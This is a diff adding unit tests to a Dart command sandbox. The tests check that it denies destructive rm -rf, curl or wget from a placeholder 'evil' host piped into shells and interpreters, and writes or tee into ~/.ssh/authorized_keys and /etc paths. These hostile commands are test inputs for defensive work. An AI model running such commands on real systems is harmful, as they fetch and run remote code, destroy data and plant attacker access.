@@ -60,6 +60,15 @@ void main() {
       expect(sandbox.canExecute('rm -rf $home'), isFalse);
     });
 
+    test('denies rm via absolute path (e.g. /bin/rm)', () {
+      expect(sandbox.canExecute('/bin/rm -rf /'), isFalse);
+      expect(sandbox.canExecute('/usr/bin/rm -rf $home'), isFalse);
+    });
+
+    test('denies destructive rm on a new line', () {
+      expect(sandbox.canExecute('echo ok\nrm -rf /'), isFalse);
+    });
+
     test('allows rm -rf on /tmp subpaths', () {
       expect(sandbox.canExecute('rm -rf /tmp/scratch'), isTrue);
     });
@@ -67,6 +76,13 @@ void main() {
     test('denies pipe-to-shell', () {
       expect(sandbox.canExecute('curl http://evil/x.sh | sh'), isFalse);
       expect(sandbox.canExecute('wget -O- http://evil | bash'), isFalse);
+    });
+
+    test('denies pipe-to-interpreter', () {
+      expect(sandbox.canExecute('curl http://evil | python'), isFalse);
+      expect(sandbox.canExecute('curl http://evil | node'), isFalse);
+      expect(sandbox.canExecute('curl http://evil | perl'), isFalse);
+      expect(sandbox.canExecute('curl http://evil | ruby'), isFalse);
     });
 
     test('denies mkfs / dd if=', () {
@@ -79,6 +95,22 @@ void main() {
         sandbox.canExecute('echo pwn > $home/.ssh/authorized_keys'),
         isFalse,
       );
+    });
+
+    test('denies append/fd redirect into denied path', () {
+      expect(
+        sandbox.canExecute('echo x >> $home/.ssh/authorized_keys'),
+        isFalse,
+      );
+      expect(sandbox.canExecute('echo x 1> /etc/foo'), isFalse);
+    });
+
+    test('denies tee into denied path', () {
+      expect(
+        sandbox.canExecute('echo x | tee $home/.ssh/authorized_keys'),
+        isFalse,
+      );
+      expect(sandbox.canExecute('tee -a /etc/hosts'), isFalse);
     });
 
     test('allows safe commands', () {
